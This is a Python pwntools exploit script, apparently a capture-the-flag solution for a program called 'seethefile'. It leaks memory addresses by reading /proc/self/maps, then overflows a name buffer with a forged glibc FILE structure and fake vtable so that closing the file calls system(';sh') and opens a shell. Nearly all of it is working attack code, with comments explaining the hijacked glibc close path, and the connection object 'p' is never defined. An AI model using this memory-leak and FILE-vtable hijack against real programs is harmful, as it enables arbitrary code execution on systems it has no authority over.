from pwn import *

pause()
def open_file(name):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", name)
    p.recvuntil("Successful")

def read_file():
    p.sendlineafter(":", "2")

def write_file():
    p.sendlineafter(":", "3")
    return p.recvuntil("----")[:-5] #-5 to delete the \n

def close_file():
    p.sendlineafter(":", "4")

open_file("/proc/self/maps")
maps_info = ""

for x in xrange(0, 4):
    read_file()
    maps_info += write_file()

heap_leak = 0
libc_leak = 0
libc_mmaped = 0
stack_leak = 0

print maps_info

for lines in maps_info.split("\n"):
    if "[heap]" in lines and not heap_leak:
        heap_leak = int("0x"+lines.split("-")[0], 16)

    if "r" in lines in lines and not libc_mmaped and '[heap]' not in lines and 'seethefile' not in lines:
        libc_mmaped = int("0x"+lines.split("-")[0], 16)

    if "[stack]" in lines and not stack_leak:
        stack_leak = int("0x"+lines.split("-")[0], 16)
    
    if '.so' in lines and not libc_leak:
        libc_leak = int("0x"+lines.split("-")[0], 16)

print "Leaked a heap base:", hex(heap_leak)
print "Leaked a mapped:", hex(libc_mmaped)
print "Leaked a stack base:", hex(stack_leak)
print "Leaked a libc base:", hex(libc_leak)

close_file()

addr_name = 0x0804B260
addr_buf = 0x0804b284
p.sendlineafter(":", "5")

pause()

l = ELF("/tmp/libc")
system = libc_leak + l.symbols['system']
print hex(system)
payload = ""
payload += p32(0xfbad2488) # file ptr signature
payload += ';sh\x00'
payload += p32(addr_buf) * 6 # fill &name out
payload += p32(addr_name) # fp
payload += p32(0x00000000) * 8 
payload += p32(addr_name+17 * 4) # point to itself [&this] = &this
payload += p32(addr_name + 0x98) # => 0xf7643f72:   mov    edx,DWORD PTR [esi+0x48]
                                 #    0xf7643f75:  mov    ebp,DWORD PTR gs:0x8
                                 #     0xf7643f7c:   cmp    ebp,DWORD PTR [edx+0x8]
                                 # esi is the start addr of FAKE_fp
                                 # can be an addr point to ZERO
vtable_addr = addr_name + len(payload) - 0x44 + 0x4 #0xf76e4b3f <_IO_file_close_it+175>:    call   DWORD PTR [eax+0x44]
payload += p32(vtable_addr)
payload += p32(system)

p.sendlineafter(":", payload)

p.interactive()


#  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
#    status = _IO_file_close_it (fp);
# because the flag was set to 0xfbad2488
# so (fp->_IO_file_flags & _IO_IS_FILEBUF) == 1
# and will call _IO_file_close_it 
# then in _IO_file_close_it  it called _IO_SYSCLOSE to jmp to __close in vtable
#int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0 ? _IO_SYSCLOSE (fp) : 0);
